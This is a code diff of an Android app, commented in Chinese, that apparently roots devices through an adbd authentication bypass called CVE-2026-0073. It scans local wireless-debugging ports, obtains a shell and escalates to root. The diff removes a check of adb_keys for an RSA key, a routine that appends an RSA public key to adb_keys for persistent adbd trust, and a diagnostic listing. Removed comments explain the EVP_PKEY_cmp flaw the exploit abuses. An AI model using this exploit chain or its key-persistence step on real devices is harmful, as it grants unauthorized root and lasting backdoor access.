@@ -203,10 +203,6 @@ public class MainActivity extends Activity {
         // ============ 阶段 A：获取 shell 域（主路 0073 → 兜底 Shizuku） ============
         Shell shell = null;
 
-        // A0) 前置检查：#0 adb_keys 隐形前提（仅在能读到时提示，读不到不阻断）
-        log("[*] 前置检查：/data/misc/adb/adb_keys ...");
-        checkAdbKeysPrecheck();
-
         // A1) 主路：0073
         log("[*] 扫描无线调试端口 127.0.0.1:30000-65535 ...");
         int port = scanPort(30000, 65535);
@@ -318,8 +314,8 @@ public class MainActivity extends Activity {
             log("========================================");
             return false;
         }
-        // ============ 阶段 D：成功收尾（#10）============
-        // 只有确认「root 真的拿到了」才做收尾；没成功就别乱动 adb_keys。
+        // ============ 阶段 D：成功收尾 ============
+        // 只有确认「root 真的拿到了」才做收尾。
         if (isRootSuccess(res)) {
             log("");
             log("========================================");
@@ -327,11 +323,10 @@ public class MainActivity extends Activity {
             log("[*] 执行成功后收尾 ...");
             log("========================================");
             cleanupStaging(shell, remote8550, remoteKsud);
-            persistAdbKey(shell);
             log("[+] 收尾完成。");
         } else {
             log("");
-            log("[!] 未检测到明确的 root 成功标志，跳过收尾（不清理、不写 adb_keys）。");
+            log("[!] 未检测到明确的 root 成功标志，跳过收尾（不清理临时文件）。");
         }
         log("==== 完成（结果见上）====");
 
@@ -378,66 +373,6 @@ public class MainActivity extends Activity {
             log("[+] D1) 清理完成（显示 No such file 即为已删除）");
         } catch (Throwable t) {
             log("[!] D1) 清理异常: " + t);
-        }
-    }
-
-    /**
-     * #10-D2：把 RSA 公钥固化进 /data/misc/adb/adb_keys。
-     *
-     * 背景（#0 的延伸）：
-     *   CVE-2026-0073 能触发的前提是 adb_keys 里存在至少一把 RSA 公钥；
-     *   而 0073 走的是「自己造的 RSA 公钥去骗过 EVP_PKEY_cmp」。
-     *   既然此刻已经是 root，就把这把公钥**真正写进 adb_keys**，
-     *   于是下次 adbd 起来会直接认它 —— 不必再重新走一遍认证绕过。
-     *
-     * 实现：
-     *   ① 先看 adb_keys 现状（可能已有内容，绝不能覆盖丢钥匙）；
-     *   ② 从常见位置找本机现成的 RSA 公钥（如 /data/misc/adb/adbkey.pub
-     *      或 App 自己生成/暂存的）；找不到就跳过并提示；
-     *   ③ 追加（不覆盖）到 adb_keys，并修正权限/SELinux 上下文。
-     */
-    private void persistAdbKey(Shell shell) {
-        try {
-            log("[*] D2) 固化 RSA 公钥到 /data/misc/adb/adb_keys ...");
-
-            // ① 现状
-            String cur = shell.exec(
-                    "ls -lZ /data/misc/adb/adb_keys 2>&1; "
-                    + "echo '--- lines ---'; wc -l /data/misc/adb/adb_keys 2>&1");
-            log(cur == null ? "(null)" : cur);
-
-            // ② 找一个可用的 RSA 公钥来源
-            String findKey =
-                    "for p in /data/misc/adb/adbkey.pub "
-                    + "/data/local/tmp/adbkey.pub "
-                    + "/data/system/users/0/adb_keys; do "
-                    + "  if [ -f $p ]; then echo FOUND:$p; head -c 64 $p; echo; fi; "
-                    + "done";
-            String found = shell.exec(findKey);
-            log("[*] 公钥候选: " + (found == null ? "(null)" : found.trim()));
-
-            if (found == null || found.indexOf("FOUND:") < 0) {
-                log("[!] 未找到可用的 RSA 公钥来源，跳过 adb_keys 固化。");
-                log("    提示：可在电脑上执行 adb keygen，或用 Shizuku 激活生成后再试。");
-                return;
-            }
-
-            // ③ 追加而非覆盖
-            String src = found.substring(found.indexOf("FOUND:") + 6);
-            src = src.substring(0, src.indexOf('\n') > 0 ? src.indexOf('\n') : src.length()).trim();
-            String add =
-                    "grep -qF \"$(cat " + src + ")\" /data/misc/adb/adb_keys 2>/dev/null "
-                    + "|| cat " + src + " >> /data/misc/adb/adb_keys; "
-                    + "chmod 640 /data/misc/adb/adb_keys 2>&1; "
-                    + "chown system:shell /data/misc/adb/adb_keys 2>&1; "
-                    + "restorecon /data/misc/adb/adb_keys 2>&1; "
-                    + "echo '--- after ---'; ls -lZ /data/misc/adb/adb_keys 2>&1; "
-                    + "wc -l /data/misc/adb/adb_keys 2>&1";
-            String r = shell.exec(add);
-            log(r == null ? "(null)" : r);
-            log("[+] D2) adb_keys 固化尝试完成（已做去重，不会重复写入）");
-        } catch (Throwable t) {
-            log("[!] D2) adb_keys 固化异常: " + t);
         }
     }
 
@@ -626,9 +561,6 @@ public class MainActivity extends Activity {
         }
 
         log("[!] no ksud found; stopping before late-load");
-        log("[*] diagnostic: ls /data/adb/");
-        String d = sh.exec("ls -la /data/adb/ 2>&1");
-        log(d == null ? "(null)" : d);
         return null;
     }
 
@@ -688,84 +620,7 @@ public class MainActivity extends Activity {
         return bos.toByteArray();
     }
 
-    /* ============================ #0 adb_keys 前置检查 ============================ */
-
-    /**
-     * #0 —— CVE-2026-0073 的**隐形前提**检查。
-     *
-     * 漏洞能否触发取决于 `/data/misc/adb/adb_keys` 里是否存在至少一把
-     * **非 EC 类型**的公钥（通常是 RSA）。AOSP 的循环漏写 "== 1"：
-     *
-     *     for (auto& key : *authorized_keys) {
-     *         if (EVP_PKEY_cmp(known_key, peer_key)) {  // -1（类型不同）也算真
-     *             authorized = true; break;
-     *         }
-     *     }
-     *
-     *   - adb_keys 为空 / 读不到 → 一次都不进循环 → 认证失败
-     *     → adbd 回 SSLV3_ALERT_CERTIFICATE_UNKNOWN
-     *   - 有 RSA 公钥            → EVP_PKEY_cmp(RSA, EC) = -1 → truthy → "骗"过认证 ✅
-     *   - 只有 EC / Ed25519      → 类型相同 = 0 → 失败
-     *
-     * **激活一次 Shizuku(ADB 模式) 就会把它的 RSA 公钥写进 adb_keys**，正好补齐条件。
-     *
-     * App 域读不了该文件内容（权限），所以这里：
-     *   ① 先尝试用 java.io.File 直接读（某些 ROM / 早期版本可读）；
-     *   ② 读不到就尝试 Shell 通道（若已有）；
-     *   ③ 都拿不到内容时，至少用 File.length() 判断「是否为空文件」；
-     *   ④ 结论只做**提示**，不阻断流程（因为真正结论由 0073 握手给出）。
-     */
-    private void checkAdbKeysPrecheck() {
-        final String PATH = "/data/misc/adb/adb_keys";
-        File f = new File(PATH);
-
-        // ① 直接读
-        try {
-            if (f.exists() && f.canRead() && f.length() > 0) {
-                String txt = new String(readAllBytes(f), "UTF-8");
-                boolean rsa = txt.indexOf("AAAAB3NzaC1yc2E") >= 0;   // ssh-rsa base64 前缀
-                boolean ec  = txt.indexOf("AAAAC3NzaC1lZDI1NTE5") >= 0  // ed25519
-                           || txt.indexOf("AAAAE2VjZHNhLXNoYTIt") >= 0;  // ecdsa
-                if (rsa) {
-                    log("[+] adb_keys 含 RSA 公钥 → 0073 触发条件满足");
-                } else if (ec) {
-                    log("[!] adb_keys 只有 EC/Ed25519 公钥 → 0073 **无法触发**");
-                    logAcbKeysGuide();
-                } else {
-                    log("[?] adb_keys 存在但未见已知公钥前缀（长度 " + f.length() + "）");
-                }
-                return;
-            }
-        } catch (Throwable ignored) {}
-
-        // ② 读不到 → 只能看存在性/大小
-        try {
-            if (!f.exists()) {
-                log("[?] 读不到 " + PATH + "（App 权限受限，属正常现象）");
-                log("    若后续 0073 报 CERTIFICATE_UNKNOWN，按下面提示处理。");
-            } else {
-                long len = f.length();
-                if (len == 0) {
-                    log("[!] adb_keys **是空文件** → 0073 必然失败（CERTIFICATE_UNKNOWN）");
-                    logAcbKeysGuide();
-                } else {
-                    log("[?] adb_keys 大小 " + len + " 字节（内容不可读，继续流程）");
-                }
-            }
-        } catch (Throwable t) {
-            log("[?] adb_keys 检查跳过: " + t);
-        }
-    }
-
-    /** 统一的「如何补齐 adb_keys」人话引导（#0 + #1 共用）。 */
-    private void logAcbKeysGuide() {
-        log("[!] 解决办法（任选其一，然后重试）：");
-        log("    1) 开发者选项 → 无线调试 → 使用配对码配对一次；");
-        log("    2) 打开一次 Shizuku（ADB 模式）—— 它会把 RSA 公钥写进 adb_keys；");
-        log("    3) 用 USB 执行一次 `adb devices`（若本机曾授权过该电脑）。");
-    }
-
-    /* ============================ port scan ============================ */
+    /* ============================ 端口扫描 ============================ */
 
     private int scanPort(int lo, int hi) {
         final List<Integer> found = new ArrayList<Integer>();
